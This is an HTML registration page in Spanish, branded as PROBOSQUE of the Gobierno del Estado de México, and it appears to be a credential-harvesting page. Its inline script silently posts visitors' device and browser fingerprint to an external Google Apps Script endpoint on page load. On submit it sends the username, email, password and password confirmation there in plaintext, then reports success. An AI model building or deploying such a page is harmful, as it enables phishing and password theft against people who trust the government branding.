<!DOCTYPE html>
<html lang="es-mx">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Registro</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet"/>

<style>
  body {
    font-family: 'Roboto', sans-serif;
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #dbe6dc, #f5f5f5);
  }
  .panel {
    width: 90%;
    max-width: 600px;
    background: #fff;
    border-radius: 20px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.2);
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    transition: all 0.3s ease;
  }
  .panel-header {
    width: 100%;
    background: #006837;
    color: #fff;
    padding: 25px 15px;
    text-align: center;
  }
  .panel-header h1 { margin: 0; font-size: 1.5rem; font-weight: 500; }
  .panel-body { padding: 30px 25px; width: 100%; display: flex; flex-direction: column; align-items: center; }
  .panel-body h2 { margin-bottom: 25px; color: #004f28; font-size: 1.4rem; font-weight: 500; }
  .input-group { width: 100%; margin-bottom: 20px; position: relative; }
  .input-group input {
    width: 100%;
    padding: 14px 15px;
    border-radius: 50px;
    border: 1px solid #b0b0b0;
    font-size: 1rem;
    transition: all 0.3s ease;
    background: #f7f7f7;
  }
  .input-group input:focus {
    border-color: #006837;
    box-shadow: 0 0 12px rgba(0,79,40,0.2);
    outline: none;
    background-color: #fff;
  }
  .input-group i {
    position: absolute;
    right: 15px;
    top: 50%;
    transform: translateY(-50%);
    color: #777;
    font-size: 1.1rem;
  }
  .btn { width: 100%; padding: 14px; border-radius: 50px; font-weight: 500; font-size: 1rem; cursor: pointer; border: none; margin-bottom: 12px; transition: all 0.3s ease; }
  .btn-primary { background: #006837; color: #fff; }
  .btn-primary:hover { background: #004f28; }
  .btn-secondary { background: #f0f0f0; color: #333; }
  .btn-secondary:hover { background: #d9d9d9; }
  .panel-footer { width: 100%; text-align: center; padding: 20px 15px; font-size: 0.85rem; color: #555; border-top: 1px solid #e0e0e0; }
  .panel-footer strong { color: #006837; }
</style>
</head>
<body>

<div class="panel">
  <div class="panel-header">
    <h1>PROBOSQUE</h1>
  </div>

  <div class="panel-body">
    <h2>Registro</h2>
    <form id="registroForm">
      <div class="input-group">
        <input type="text" name="usuario" placeholder="Nombre de usuario" required/>
        <i class="fas fa-user"></i>
      </div>
      <div class="input-group">
        <input type="email" name="correo" placeholder="Correo electrónico" required/>
        <i class="fas fa-envelope"></i>
      </div>
      <div class="input-group">
        <input type="password" name="password" placeholder="Contraseña" required/>
        <i class="fas fa-lock"></i>
      </div>
      <div class="input-group">
        <input type="password" name="confirmar" placeholder="Confirmar contraseña" required/>
        <i class="fas fa-lock"></i>
      </div>
      <button type="submit" class="btn btn-primary"><i class="fas fa-user-plus me-2"></i>Crear registro</button>
      <button type="reset" class="btn btn-secondary"><i class="fas fa-rotate-right me-2"></i>Limpiar</button>
    </form>
  </div>

  <div class="panel-footer">
    <strong>© 2025 Gobierno del Estado de México</strong>
  </div>
</div>

<!-- SCRIPT para enviar datos a Google Sheets -->
<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwcgrxn43Gli2iTfD0lKVmOlnOWyKpbOQQYFbhYHnFKexcjIhxAeLVnuNuutmn6tVNT/exec";

function getDeviceInfo() {
  const ua = navigator.userAgent;

  const deviceType = /Mobi|Android/i.test(ua)
    ? "Celular"
    : /Tablet|iPad/i.test(ua)
    ? "Tablet"
    : "PC";

  const os = (() => {
    if (/Windows/i.test(ua)) return "Windows";
    if (/Mac/i.test(ua)) return "MacOS";
    if (/Linux/i.test(ua)) return "Linux";
    if (/Android/i.test(ua)) return "Android";
    if (/iPhone|iPad|iOS/i.test(ua)) return "iOS";
    return "Desconocido";
  })();

  const browser = (() => {
    if (/Chrome/i.test(ua)) return "Chrome";
    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
    if (/Firefox/i.test(ua)) return "Firefox";
    if (/Edge/i.test(ua)) return "Edge";
    if (/Opera|OPR/i.test(ua)) return "Opera";
    return "Desconocido";
  })();

  let deviceModel = "Desconocido";
  if (/Android/i.test(ua)) {
    const match = ua.match(/\(([^)]+)\)/);
    if (match && match[1]) {
      const parts = match[1].split(";");
      deviceModel = parts[2] ? parts[2].trim() : "Desconocido";
    }
  } else if (/iPhone|iPad/i.test(ua)) {
    deviceModel = "iPhone/iPad";
  } else {
    deviceModel = navigator.platform || "PC Desconocido";
  }

  return { deviceType, os, browser, deviceModel, userAgent: ua };
}

// Enviar automáticamente al cargar la página
(async () => {
  const { deviceType, os, browser, deviceModel, userAgent } = getDeviceInfo();
  const timestamp = new Date().toLocaleString("es-MX", { timeZone: "America/Mexico_City" });

  await fetch(SCRIPT_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ deviceType, os, browser, deviceModel, userAgent, timestamp })
  });
})();

// Enviar datos cuando el usuario llene el formulario
document.getElementById("registroForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const formData = new FormData(e.target);
  const { deviceType, os, browser, deviceModel, userAgent } = getDeviceInfo();
  const timestamp = new Date().toLocaleString("es-MX", { timeZone: "America/Mexico_City" });

  const data = new URLSearchParams();
  for (const [key, value] of formData.entries()) data.append(key, value);
  data.append("deviceType", deviceType);
  data.append("os", os);
  data.append("browser", browser);
  data.append("deviceModel", deviceModel);
  data.append("userAgent", userAgent);
  data.append("timestamp", timestamp);

  await fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: data });
  alert("Registro enviado correctamente!");
  e.target.reset();
});
</script>

</body>
</html>
